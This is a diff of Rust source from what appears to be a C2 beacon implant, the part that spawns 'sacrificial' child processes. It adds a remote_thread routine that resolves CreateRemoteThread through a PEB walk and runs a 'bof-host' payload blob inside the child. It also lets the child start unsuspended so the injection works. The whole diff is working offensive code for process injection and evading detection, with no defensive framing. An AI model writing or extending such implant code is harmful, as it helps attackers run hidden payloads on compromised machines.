@@ -152,7 +152,7 @@ impl Drop for SacrificialProcess {
 pub unsafe fn create_sacrificial(spawn_to: &str) -> Result<SacrificialProcess, &'static str> {
     let create_proc = unsafe { create_sacrificial_resolve() }?;
     let (mut cmd, mut si, mut pi) = create_sacrificial_buffers(spawn_to);
-    unsafe { create_sacrificial_spawn(create_proc, &mut cmd, &mut si, &mut pi, 0) }
+    unsafe { create_sacrificial_spawn(create_proc, &mut cmd, &mut si, &mut pi, 0, true) }
 }
 
 /// `CreateProcessW` (kernel32) — resolved via PEB walk for the sacrificial
@@ -206,8 +206,10 @@ unsafe fn create_sacrificial_spawn(
     si: &mut [u8; 104],
     pi: &mut [u8; 24],
     inherit: i32,
+    suspended: bool,
 ) -> Result<SacrificialProcess, &'static str> {
-    // CREATE_SUSPENDED (0x4). No environment, no current dir.
+    // CREATE_SUSPENDED (0x4) when requested (B3 runs the child normally —
+    // kernel32 + loader must initialize so bof-host's PEB walk works).
     const CREATE_SUSPENDED: u32 = 0x4;
     let ok = unsafe {
         create_proc(
@@ -216,7 +218,7 @@ unsafe fn create_sacrificial_spawn(
             core::ptr::null_mut(), // lpProcessAttributes
             core::ptr::null_mut(), // lpThreadAttributes
             inherit,               // bInheritHandles
-            CREATE_SUSPENDED,
+            if suspended { CREATE_SUSPENDED } else { 0 },
             core::ptr::null_mut(), // lpEnvironment
             core::ptr::null(),     // lpCurrentDirectory
             si.as_mut_ptr(),       // lpStartupInfo
@@ -286,6 +288,67 @@ struct SecurityAttributes {
 /// # Safety
 /// Uses Win32 CreateProcessW/CreatePipe via PEB-walk resolution.
 /// Single-threaded beacon context.
+/// `HANDLE CreateRemoteThread(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
+/// LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)` — run `entry` (the
+/// bof-host blob base) in the child with `arg` (payload pointer) as rcx.
+pub unsafe fn remote_thread(
+    proc_handle: *mut c_void,
+    entry: usize,
+    arg: usize,
+) -> Result<(), &'static str> {
+    let f: unsafe extern "system" fn(
+        *mut c_void,
+        *mut c_void,
+        usize,
+        unsafe extern "system" fn(usize) -> u32,
+        usize,
+        u32,
+        *mut u32,
+    ) -> *mut c_void = core::mem::transmute(
+        export_addr(b"kernel32.dll", b"CreateRemoteThread")
+            .ok_or("CreateRemoteThread unresolved")?,
+    );
+    // The thunk needs the real entry address; a static is fine here (this
+    // crate is std; the isolated path is single-threaded).
+    static THUNK_ENTRY: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);
+    unsafe extern "system" fn thunk(arg: usize) -> u32 {
+        // The bof-host entry diverges (ExitProcess); if it ever returns,
+        // return 0.
+        let entry_fn: unsafe extern "system" fn(usize) -> ! =
+            core::mem::transmute(THUNK_ENTRY.load(core::sync::atomic::Ordering::SeqCst));
+        unsafe { entry_fn(arg) };
+        0
+    }
+    THUNK_ENTRY.store(entry, core::sync::atomic::Ordering::SeqCst);
+    let h = unsafe {
+        f(
+            proc_handle,
+            core::ptr::null_mut(),
+            0,
+            thunk,
+            arg,
+            0,
+            core::ptr::null_mut(),
+        )
+    };
+    if h.is_null() {
+        return Err("CreateRemoteThread returned null");
+    }
+    if let Some(close) = export_addr(b"kernel32.dll", b"CloseHandle") {
+        let close_fn: unsafe extern "system" fn(*mut c_void) -> i32 = core::mem::transmute(close);
+        let _ = unsafe { close_fn(h) };
+    }
+    Ok(())
+}
+
+/// `VOID Sleep(DWORD)` — kernel32 Sleep (parent process; always available).
+pub unsafe fn sleep_ms(ms: u32) {
+    if let Some(addr) = export_addr(b"kernel32.dll", b"Sleep") {
+        let f: unsafe extern "system" fn(u32) = core::mem::transmute(addr);
+        unsafe { f(ms) };
+    }
+}
+
 pub unsafe fn create_sacrificial_isolated(
     spawn_to: &str,
 ) -> Result<(SacrificialProcess, *mut c_void, usize), &'static str> {
@@ -295,7 +358,9 @@ pub unsafe fn create_sacrificial_isolated(
     let pipe_write_val = pipe_write as usize;
     let (mut cmd, mut si, mut pi) = create_sacrificial_buffers(spawn_to);
     isolated_startup(&mut si, pipe_write);
-    match unsafe { create_sacrificial_spawn(create_proc, &mut cmd, &mut si, &mut pi, 1) } {
+    // NOT suspended: the child must load normally (kernel32 + Ldr) before
+    // bof-host runs via CreateRemoteThread.
+    match unsafe { create_sacrificial_spawn(create_proc, &mut cmd, &mut si, &mut pi, 1, false) } {
         Ok(proc) => {
             close(pipe_write); // child holds its own inherited writer
             Ok((proc, pipe_read, pipe_write_val))
